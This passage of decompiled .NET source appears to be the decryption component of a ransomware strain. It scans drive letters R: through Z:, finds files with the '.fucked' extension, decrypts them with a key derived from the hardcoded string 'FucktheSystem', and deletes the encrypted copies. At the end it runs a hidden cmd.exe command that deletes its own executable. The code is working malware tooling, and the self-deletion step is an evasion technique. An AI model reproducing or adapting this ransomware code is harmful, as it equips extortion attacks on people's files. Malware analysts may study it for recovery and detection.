				if (!directory17.EndsWith("Bin") && !directory17.EndsWith("indows") && !directory17.EndsWith("tings") && !directory17.EndsWith("System Volume Information") && !directory17.EndsWith("cache") && !directory17.EndsWith("very") && !directory17.EndsWith("rogram Files (x86)") && !directory17.EndsWith("rogram Files") && !directory17.EndsWith("boot") && !directory17.EndsWith("efi") && !directory17.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory17);
					ListBox9.get_Items().Add((object)directory17);
				}
			}
		}
		catch (Exception projectError17)
		{
			ProjectData.SetProjectError(projectError17);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory18 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("R:\\"))
			{
				if (!directory18.EndsWith("Bin") && !directory18.EndsWith("indows") && !directory18.EndsWith("tings") && !directory18.EndsWith("System Volume Information") && !directory18.EndsWith("cache") && !directory18.EndsWith("very") && !directory18.EndsWith("rogram Files (x86)") && !directory18.EndsWith("rogram Files") && !directory18.EndsWith("boot") && !directory18.EndsWith("efi") && !directory18.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory18);
					ListBox9.get_Items().Add((object)directory18);
				}
			}
		}
		catch (Exception projectError18)
		{
			ProjectData.SetProjectError(projectError18);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory19 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("S:\\"))
			{
				if (!directory19.EndsWith("Bin") && !directory19.EndsWith("indows") && !directory19.EndsWith("tings") && !directory19.EndsWith("System Volume Information") && !directory19.EndsWith("cache") && !directory19.EndsWith("very") && !directory19.EndsWith("rogram Files (x86)") && !directory19.EndsWith("rogram Files") && !directory19.EndsWith("boot") && !directory19.EndsWith("efi") && !directory19.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory19);
					ListBox9.get_Items().Add((object)directory19);
				}
			}
		}
		catch (Exception projectError19)
		{
			ProjectData.SetProjectError(projectError19);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory20 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("T:\\"))
			{
				if (!directory20.EndsWith("Bin") && !directory20.EndsWith("indows") && !directory20.EndsWith("tings") && !directory20.EndsWith("System Volume Information") && !directory20.EndsWith("cache") && !directory20.EndsWith("very") && !directory20.EndsWith("rogram Files (x86)") && !directory20.EndsWith("rogram Files") && !directory20.EndsWith("boot") && !directory20.EndsWith("efi") && !directory20.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory20);
					ListBox9.get_Items().Add((object)directory20);
				}
			}
		}
		catch (Exception projectError20)
		{
			ProjectData.SetProjectError(projectError20);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory21 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("U:\\"))
			{
				if (!directory21.EndsWith("Bin") && !directory21.EndsWith("indows") && !directory21.EndsWith("tings") && !directory21.EndsWith("System Volume Information") && !directory21.EndsWith("cache") && !directory21.EndsWith("very") && !directory21.EndsWith("rogram Files (x86)") && !directory21.EndsWith("rogram Files") && !directory21.EndsWith("boot") && !directory21.EndsWith("efi") && !directory21.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory21);
					ListBox9.get_Items().Add((object)directory21);
				}
			}
		}
		catch (Exception projectError21)
		{
			ProjectData.SetProjectError(projectError21);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory22 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("V:\\"))
			{
				if (!directory22.EndsWith("Bin") && !directory22.EndsWith("indows") && !directory22.EndsWith("tings") && !directory22.EndsWith("System Volume Information") && !directory22.EndsWith("cache") && !directory22.EndsWith("very") && !directory22.EndsWith("rogram Files (x86)") && !directory22.EndsWith("rogram Files") && !directory22.EndsWith("boot") && !directory22.EndsWith("efi") && !directory22.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory22);
					ListBox9.get_Items().Add((object)directory22);
				}
			}
		}
		catch (Exception projectError22)
		{
			ProjectData.SetProjectError(projectError22);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory23 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("W:\\"))
			{
				if (!directory23.EndsWith("Bin") && !directory23.EndsWith("indows") && !directory23.EndsWith("tings") && !directory23.EndsWith("System Volume Information") && !directory23.EndsWith("cache") && !directory23.EndsWith("very") && !directory23.EndsWith("rogram Files (x86)") && !directory23.EndsWith("rogram Files") && !directory23.EndsWith("boot") && !directory23.EndsWith("efi") && !directory23.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory23);
					ListBox9.get_Items().Add((object)directory23);
				}
			}
		}
		catch (Exception projectError23)
		{
			ProjectData.SetProjectError(projectError23);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory24 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("X:\\"))
			{
				if (!directory24.EndsWith("Bin") && !directory24.EndsWith("indows") && !directory24.EndsWith("tings") && !directory24.EndsWith("System Volume Information") && !directory24.EndsWith("cache") && !directory24.EndsWith("very") && !directory24.EndsWith("rogram Files (x86)") && !directory24.EndsWith("rogram Files") && !directory24.EndsWith("boot") && !directory24.EndsWith("efi") && !directory24.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory24);
					ListBox9.get_Items().Add((object)directory24);
				}
			}
		}
		catch (Exception projectError24)
		{
			ProjectData.SetProjectError(projectError24);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory25 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("Y:\\"))
			{
				if (!directory25.EndsWith("Bin") && !directory25.EndsWith("indows") && !directory25.EndsWith("tings") && !directory25.EndsWith("System Volume Information") && !directory25.EndsWith("cache") && !directory25.EndsWith("very") && !directory25.EndsWith("rogram Files (x86)") && !directory25.EndsWith("rogram Files") && !directory25.EndsWith("boot") && !directory25.EndsWith("efi") && !directory25.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory25);
					ListBox9.get_Items().Add((object)directory25);
				}
			}
		}
		catch (Exception projectError25)
		{
			ProjectData.SetProjectError(projectError25);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory26 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("Z:\\"))
			{
				if (!directory26.EndsWith("Bin") && !directory26.EndsWith("indows") && !directory26.EndsWith("tings") && !directory26.EndsWith("System Volume Information") && !directory26.EndsWith("cache") && !directory26.EndsWith("very") && !directory26.EndsWith("rogram Files (x86)") && !directory26.EndsWith("rogram Files") && !directory26.EndsWith("boot") && !directory26.EndsWith("efi") && !directory26.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory26);
					ListBox9.get_Items().Add((object)directory26);
				}
			}
		}
		catch (Exception projectError26)
		{
			ProjectData.SetProjectError(projectError26);
			ProjectData.ClearProjectError();
		}
		Timer1.Start();
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		ProgressBar1.set_Maximum(ListBox1.get_Items().get_Count());
		if (ProgressBar1.get_Value() == ListBox1.get_Items().get_Count())
		{
			Timer1.Stop();
			Timer2.Start();
			return;
		}
		ListBox1.set_SelectedIndex(ProgressBar1.get_Value());
		ListBox1.set_SelectionMode((SelectionMode)1);
		filenamez = Conversions.ToString(ListBox1.get_SelectedItem());
		try
		{
			foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(filenamez))
			{
				ListBox2.get_Items().Add((object)directory);
				ListBox9.get_Items().Add((object)directory);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		ProgressBar1.Increment(1);
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		ProgressBar2.set_Maximum(ListBox2.get_Items().get_Count());
		if (ProgressBar2.get_Value() == ListBox2.get_Items().get_Count())
		{
			Timer2.Stop();
			Timer3.Start();
			return;
		}
		ListBox2.set_SelectedIndex(ProgressBar2.get_Value());
		ListBox2.set_SelectionMode((SelectionMode)1);
		filenamez = Conversions.ToString(ListBox2.get_SelectedItem());
		try
		{
			foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(filenamez))
			{
				ListBox3.get_Items().Add((object)directory);
				ListBox9.get_Items().Add((object)directory);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		ProgressBar2.Increment(1);
	}

	private void Timer3_Tick(object sender, EventArgs e)
	{
		ProgressBar3.set_Maximum(ListBox3.get_Items().get_Count());
		if (ProgressBar3.get_Value() == ListBox3.get_Items().get_Count())
		{
			Timer3.Stop();
			Timer4.Start();
			return;
		}
		ListBox3.set_SelectedIndex(ProgressBar3.get_Value());
		ListBox3.set_SelectionMode((SelectionMode)1);
		filenamez = Conversions.ToString(ListBox3.get_SelectedItem());
		try
		{
			foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(filenamez))
			{
				ListBox4.get_Items().Add((object)directory);
				ListBox9.get_Items().Add((object)directory);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		ProgressBar3.Increment(1);
	}

	private void Timer4_Tick(object sender, EventArgs e)
	{
		ProgressBar4.set_Maximum(ListBox4.get_Items().get_Count());
		if (ProgressBar4.get_Value() == ListBox4.get_Items().get_Count())
		{
			Timer4.Stop();
			Timer5.Start();
			return;
		}
		ListBox4.set_SelectedIndex(ProgressBar4.get_Value());
		ListBox4.set_SelectionMode((SelectionMode)1);
		filenamez = Conversions.ToString(ListBox4.get_SelectedItem());
		try
		{
			foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(filenamez))
			{
				ListBox5.get_Items().Add((object)directory);
				ListBox9.get_Items().Add((object)directory);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		ProgressBar4.Increment(1);
	}

	private void Timer5_Tick(object sender, EventArgs e)
	{
		ProgressBar5.set_Maximum(ListBox5.get_Items().get_Count());
		if (ProgressBar5.get_Value() == ListBox5.get_Items().get_Count())
		{
			Timer5.Stop();
			Timer6.Start();
			return;
		}
		ListBox5.set_SelectedIndex(ProgressBar5.get_Value());
		ListBox5.set_SelectionMode((SelectionMode)1);
		filenamez = Conversions.ToString(ListBox5.get_SelectedItem());
		try
		{
			foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(filenamez))
			{
				ListBox6.get_Items().Add((object)directory);
				ListBox9.get_Items().Add((object)directory);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		ProgressBar5.Increment(1);
	}

	private void Timer6_Tick(object sender, EventArgs e)
	{
		ProgressBar6.set_Maximum(ListBox6.get_Items().get_Count());
		if (ProgressBar6.get_Value() == ListBox6.get_Items().get_Count())
		{
			Timer6.Stop();
			Timer7.Start();
			return;
		}
		ListBox6.set_SelectedIndex(ProgressBar6.get_Value());
		ListBox6.set_SelectionMode((SelectionMode)1);
		filenamez = Conversions.ToString(ListBox6.get_SelectedItem());
		try
		{
			foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(filenamez))
			{
				ListBox7.get_Items().Add((object)directory);
				ListBox9.get_Items().Add((object)directory);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		ProgressBar6.Increment(1);
	}

	private void Timer7_Tick(object sender, EventArgs e)
	{
		ProgressBar7.set_Maximum(ListBox9.get_Items().get_Count());
		if (ProgressBar7.get_Value() == ListBox9.get_Items().get_Count())
		{
			Timer7.Stop();
			Timer8.Start();
			return;
		}
		ListBox9.set_SelectedIndex(ProgressBar7.get_Value());
		ListBox9.set_SelectionMode((SelectionMode)1);
		filenamez = Conversions.ToString(ListBox9.get_SelectedItem());
		try
		{
			foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(filenamez))
			{
				if (file.EndsWith(".fucked"))
				{
					ListBox8.get_Items().Add((object)file);
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		ProgressBar7.Increment(1);
	}

	private void Timer8_Tick(object sender, EventArgs e)
	{
		ProgressBar9.set_Maximum(ListBox8.get_Items().get_Count());
		if (ProgressBar9.get_Value() == ListBox8.get_Items().get_Count())
		{
			Timer1.set_Interval(5000);
			Timer1.Stop();
			Process.Start(new ProcessStartInfo
			{
				Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.get_ExecutablePath().ToString() + "\"",
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = "cmd.exe"
			});
			Application.ExitThread();
			return;
		}
		ListBox8.set_SelectedIndex(ProgressBar9.get_Value());
		ListBox8.set_SelectionMode((SelectionMode)1);
		string text = Conversions.ToString(ListBox8.get_SelectedItem());
		try
		{
			byte[] bytKey = MyProject.Forms.Form1.CreateKey("FucktheSystem");
			byte[] bytIV = MyProject.Forms.Form1.CreateIV("FucktheSystem");
			string strOutputFile = Strings.Replace(text, ".fucked", "", 1, -1, (CompareMethod)0);
			MyProject.Forms.Form1.EncryptOrDecryptFile(text, strOutputFile, bytKey, bytIV, Form1.CryptoAction.ActionDecrypt);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(text);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		ProgressBar9.Increment(1);
		Label1.set_Text(text);
		Label3.set_Text(text);
	}
}
